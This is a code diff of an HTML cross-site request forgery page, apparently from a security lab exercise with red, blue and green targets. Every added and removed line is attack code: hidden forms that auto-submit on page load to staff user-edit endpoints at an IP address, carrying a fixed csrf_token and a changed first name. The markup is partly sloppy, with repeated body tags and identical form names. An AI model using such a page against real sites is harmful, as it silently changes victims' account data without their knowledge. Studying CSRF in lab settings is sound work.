@@ -1,11 +1,32 @@
-<body onload="document.csrfForm.submit()">
-<form id="csrfForm" name="csrfForm" action="https://35.184.88.145/red/public/staff/users/edit.php?id=1" method="POST">
-<input type="hidden" name="csrf_token" value="5406e4d23dd04ad306af2adda5196cc6">
+<body onload="document.blueForm.submit()">
+<body onload="document.greenForm.submit()">
+<body onload="document.redForm.submit()">
 
+  
+  
+<form id="blueForm" name="csrfForm" action="https://35.184.88.145/blue/public/staff/users/edit.php?id=1" method="POST">
+<input type="hidden" name="csrf_token" value="bff5f1c15753c911eb6500e180984c79">
 <input type="text" name="first_name" value="Jimmy">
 <input type="submit"  value="Update">
 </form>
   
-  <script>document.getElementById("csrfForm").submit();</script>
+<form id="greenForm" name="csrfForm" action="https://35.184.88.145/green/public/staff/users/edit.php?id=1" method="POST">
+<input type="hidden" name="csrf_token" value="bff5f1c15753c911eb6500e180984c79">
+<input type="text" name="first_name" value="Jimmy">
+<input type="submit"  value="Update">
+</form>
+  
+<form id="redForm" name="csrfForm" action="https://35.184.88.145/red/public/staff/users/edit.php?id=1" method="POST">
+<input type="hidden" name="csrf_token" value="bff5f1c15753c911eb6500e180984c79">
+<input type="text" name="first_name" value="Jimmy">
+<input type="submit"  value="Update">
+</form>
+    
+  
+  
+  
+  
+  
+<script>document.getElementById("blueForm").submit();</script>
 </body>
 
